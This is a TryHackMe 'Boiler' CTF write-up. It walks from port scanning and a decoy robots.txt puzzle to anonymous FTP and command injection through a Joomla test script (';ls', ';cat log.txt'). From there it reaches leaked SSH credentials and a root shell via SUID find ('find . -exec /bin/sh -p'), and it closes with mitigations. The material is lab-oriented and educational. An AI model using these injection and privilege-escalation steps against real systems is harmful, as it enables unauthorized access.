```
 ██████╗  ██████╗ ██╗██╗     ███████╗██████╗      ██████╗████████╗███████╗
 ██╔══██╗██╔═══██╗██║██║     ██╔════╝██╔══██╗    ██╔════╝╚══██╔══╝██╔════╝
 ██████╔╝██║   ██║██║██║     █████╗  ██████╔╝    ██║        ██║   █████╗
 ██╔══██╗██║   ██║██║██║     ██╔══╝  ██╔══██╗    ██║        ██║   ██╔══╝
 ██████╔╝╚██████╔╝██║███████╗███████╗██║  ██║    ╚██████╗   ██║   ██║
 ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝     ╚═════╝   ╚═╝   ╚═╝
              TryHackMe: Boiler CTF
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-19 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Medium | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~14 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: FTP (21), HTTP (80), Webmin (10000)
- [x] Feroxbuster: found `/joomla/` and `/manual/`
- [x] `robots.txt`: fake subdomain hints + ASCII decimal sequence
- [x] Decoded ASCII → Base64 → MD5 hash, cracked with John → `kidding`
- [x] Anonymous FTP → `.info.txt` → ROT13-encoded hint about enumeration
- [x] Found `/joomla/_test/index.php?plot=`: command injection / LFI
- [x] Command injection → read `log.txt` → SSH credentials for `basterd`
- [x] Initial SSH attempt failed on port 22: re-scanned, found SSH on port 55007
- [x] SSH login as `basterd` on port 55007
- [x] Found `backup.sh` with hardcoded `stoner` credentials in a comment
- [x] SSH login as `stoner`
- [x] Found `.secret` file: actually the user flag, oddly named
- [x] SUID `find` binary identified
- [x] `find . -exec /bin/sh -p \;` → root shell
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning (two passes: second pass found SSH)
- 🕷️ Feroxbuster: web directory enumeration
- 🔓 John the Ripper: MD5 hash cracking
- 💉 Command injection: Joomla test script parameter
- 🔑 SSH: credential-based shell access (non-standard port)

---

## ⚡ TL;DR

A multi-layer decoding puzzle in `robots.txt` (ASCII → Base64 → MD5, cracked to `kidding`) turned out to be a taunt rather than a credential. The real path ran through anonymous FTP (a ROT13 hint about enumeration) and a Joomla test script vulnerable to command injection, which leaked SSH credentials for `basterd` from a log file. SSH wasn't on port 22: a second full port scan found it on 55007. From `basterd`, a backup script with hardcoded credentials in a comment gave lateral access to `stoner`. The user flag was a misleadingly named `.secret` file. SUID `find` finished the job with a one-line GTFOBins escape to root.

---

## 📖 Introduction

Today's target is **Boiler CTF**: a box that opens with one of the more elaborate red herrings in this entire series: a three-layer encoding puzzle in `robots.txt` that decodes to an MD5 hash, which cracks to the word `kidding`. It's not a password. It's the box laughing at you for falling for it. The real path runs quieter: anonymous FTP with a ROT13 riddle reminding you that "enumeration is the key," a Joomla test endpoint with a textbook command injection flaw, and SSH relocated to a five-digit port that costs you a moment of confusion before a second scan reveals it. The escalation chain ends on a misleadingly named flag file and a SUID `find` binary that's been on every escalation cheat sheet for a decade.

### Prerequisites

Readers are assumed to know:

- Multi-layer encoding (ASCII decimal, Base64, hex/MD5) and how to peel back each layer
- What ROT13 is and why applying it twice returns the original text
- What command injection is and how `;` chains commands in a vulnerable parameter
- How to spot SSH on a non-standard port via a full port range scan
- What SUID `find` grants via the `-exec` flag

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan: Pass 1

```bash
rustscan -a 10.49.154.195 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.3: anonymous allowed |
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) |
| 10000/tcp | HTTP | MiniServ 1.930 (Webmin) |

No SSH on this first pass: worth remembering for later.

### Web Directory Enumeration

```bash
feroxbuster -u http://10.49.154.195/ \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -x php,xt,html
```

```
# relevant hits
301  /joomla       # ^^^ CMS install
301  /manual       # Apache docs: noise
```

`/manual/` is the stock Apache documentation tree: hundreds of hits, zero value. `/joomla/` is the real target.

### robots.txt: The Decoy Puzzle

```
http://10.49.154.195/robots.txt
```

```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 055 048 077 084 103 121 089 109 070 104 078 084 069 049 079 084 084 074 067 075
```

The fake subdomain list (`/yellow`, `/not`, `/a+rabbit`, `/hole`, `/or`, `/is`, `/it`: reading as "yellow, not a rabbit hole, or is it") is the box's own joke about itself. The number sequence underneath looked suspicious enough to decode.

**Layer 1: ASCII decimal to text:** each three-digit group is a decimal ASCII code. Converted directly:

```
OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
```

**Layer 2: Base64 decode:**

```
99b0660cd95adea327c54182baa51584
```

**Layer 3: Hash identification:** 32 hex characters = MD5 format.

*Cracking with John:*

```bash
echo "99b0660cd95adea327c54182baa51584" > hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
kidding   (?)
```

The hash decodes to the word `kidding`. The box is explicitly telling you this entire puzzle was a joke: not a credential. Worth checking against FTP/SSH regardless (it wasn't), but the real path lies elsewhere.

---

## 🚪 Foothold

*(~12 mins into the box)*

### Anonymous FTP: ROT13 Hint

```bash
ftp 10.49.154.195
# Name: anonymous
ftp> get .info.txt
```

```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

**What is ROT13?** A substitution cipher that shifts each letter 13 positions through the alphabet. Since the alphabet has 26 letters, applying ROT13 twice returns the original text: making it self-inverse and trivial to decode by hand or with any online tool.

Decoded:

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

A direct hint pointing back at thorough enumeration: appropriate, since the box's actual vulnerability is still ahead.

### Joomla Command Injection

Enumerating `/joomla/` further surfaced `/joomla/_test/`: a test script outside the normal CMS structure. Its parameter behaviour suggested command execution:

```
http://10.49.154.195/joomla/_test/index.php?plot=LINUX
```

**Confirming command injection** by chaining a command with a semicolon:

```
http://10.49.154.195/joomla/_test/index.php?plot=;ls
```

The response includes directory contents: including a standout file, `log.txt`.

*Reading the log file via the same injection point:*

```
http://10.49.154.195/joomla/_test/index.php?plot=;cat%20log.txt
```

The log contains SSH credentials in plaintext:

```
user pestest
user basterd pass superduperp@$$ port 49824
```

Username `basterd`, password `superduperp@$$`, and a port number that turned out to be a red herring.

### Credentials Found

| Username | Password | Where Found |
| --- | --- | --- |
| `basterd` | `superduperp@$$` | Command injection → `log.txt` |

---

## 🐚 Shell / Access

*(~20 mins into the box)*

### SSH on a Non-Standard Port

The log file's mentioned port (49824) refused connections:

```bash
ssh basterd@10.49.154.195 -p 49824
# Connection refused
```

```bash
ssh basterd@10.49.154.195
# Connection refused: port 22 doesn't even have SSH running
```

The first port scan never found SSH at all: meaning it's running on a non-standard port not in RustScan's default range, or the scan simply missed it on the first sweep. A second, full-range Nmap scan resolved it:

```bash
nmap -sV -p- 10.49.154.195
```

```
55007/tcp open  ssh    OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

*SSH on the correct port:*

```bash
ssh basterd@10.49.154.195 -p 55007
# Password: superduperp@$$
```

```
basterd@Vulnerable:~$
```

### Lateral Move: basterd → stoner

```bash
ls -lah
# -rwxr-xr-x 1 stoner basterd 699 backup.sh
```

`backup.sh` is owned by `stoner` but readable by `basterd`'s group:

```bash
cat backup.sh
```

```bash
USER=stoner
#superduperp@$$no1knows
```

A commented-out line containing what looks like `stoner`'s password: appended directly after the reused `basterd` password fragment as a kind of in-joke (`superduperp@$$` + `no1knows`).

*SSH as `stoner` using the full string from the comment:*

```bash
ssh stoner@10.49.154.195 -p 55007
# Password: superduperp@$$no1knows
```

```
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

`.secret` looked like flavour text at first glance, but it's actually the user flag, just unusually named and hidden as a dotfile rather than the expected `user.txt`.

---

## 📈 Escalation

*(~30 mins into the box)*

### SUID find: Classic GTFOBins

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/find    # ^^^ SUID find: itself
```

**Why is SUID `find` dangerous?** `find` supports an `-exec` flag that runs an arbitrary command for each matched file. When `find` itself has the SUID bit set, any command passed to `-exec` inherits root privileges: including spawning a shell directly.

*One-line escalation:*

```bash
/usr/bin/find . -exec /bin/sh -p \;
```

```
# root shell
# cat /root/root.txt
It wasn't that hard, was it?
```

---

## 💥 Exploitation

The complete attack chain:

1. **`robots.txt`** decoy puzzle (ASCII → Base64 → MD5) → `kidding` (red herring, confirmed not a credential)
2. **Anonymous FTP** → `.info.txt` ROT13 hint about enumeration
3. **Joomla `_test` command injection** → read `log.txt` → `basterd:superduperp@$$`
4. **Second port scan** found SSH on port 55007 (not 22, not the red-herring port in the log)
5. **SSH as `basterd`** → `backup.sh` comment leaked `stoner`'s password
6. **SSH as `stoner`** → `.secret` (the real, oddly-named user flag)
7. **SUID `find`** → `find . -exec /bin/sh -p \;` → root shell → root flag

---

## 🐇 Rabbit Holes

### The robots.txt Decoding Puzzle Itself

The entire three-layer decode (ASCII → Base64 → MD5 → John) led to the word `kidding`: a deliberate troll by the box author. It cost real time (decoding plus a John run) for zero progress toward the actual foothold. The lesson generalises: an elaborate puzzle isn't proof it's load-bearing; sometimes a box wants you to spend twenty minutes proving to yourself it was a joke.

### Wrong SSH Port from the Log File

The `log.txt` file explicitly stated "port 49824" right next to the credentials, and that port refused every connection. The actual SSH port (55007) only appeared in a full re-scan. The log's stated port was either stale, a separate red herring, or referred to a different, unused configuration. Trusting a discovered artefact's stated port without independently verifying it via a port scan cost a few minutes of confusion.

### Searching for `user.txt` by Name

`find / -iname "*user*.txt"` returned nothing because the real flag was named `.secret`: a dotfile with no relation to the expected naming convention. The lesson from Blog and Watcher repeats here: never assume a flag's filename; search broadly and read everything in a freshly accessed home directory, including dotfiles.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `You made it till here, well done.` | `/home/stoner/.secret` |
| Root | `It wasn't that hard, was it?` | `/root/root.txt` |

*Note: this box's flags are flavour-text messages rather than the typical hash/UUID format: consistent with its overall troll-heavy tone.*

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Anonymous FTP enabled | Medium | Disable anonymous FTP; restrict to authenticated users only |
| Joomla test script with command injection | Critical | Never deploy test/debug scripts to a production server; validate and sanitise all user input passed to system calls; use parameterised execution, never string concatenation into a shell |
| SSH credentials logged in plaintext (`log.txt`) | Critical | Never log credentials in any file; if logging authentication attempts, log only usernames and outcomes, never passwords |
| Password fragment exposed in a backup script comment | High | Remove all commented-out credentials from scripts before deployment; use a secrets manager or environment variables instead |
| SUID bit set on `find` | Critical | Remove the SUID bit from `find`: it has no legitimate need for it; audit all SUID binaries regularly against GTFOBins |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Not every encoded string or elaborate puzzle is a critical clue: sometimes the box is testing whether you'll waste twenty minutes decoding a joke instead of moving on to broader enumeration. Decode it, note the result, and don't let sunk cost convince you it must lead somewhere just because it took effort to get there.

---

## 🔁 If I Did It Again

Run a full `-p-` Nmap scan immediately after the first RustScan pass, rather than trusting a credential log's stated port number: the actual SSH port was only found by re-scanning, and that detour could have been avoided by scanning thoroughly from the start.

---

## 🔚 Changelog

*Last updated: 2026-06-19*

---

[↑ Back to top](#)
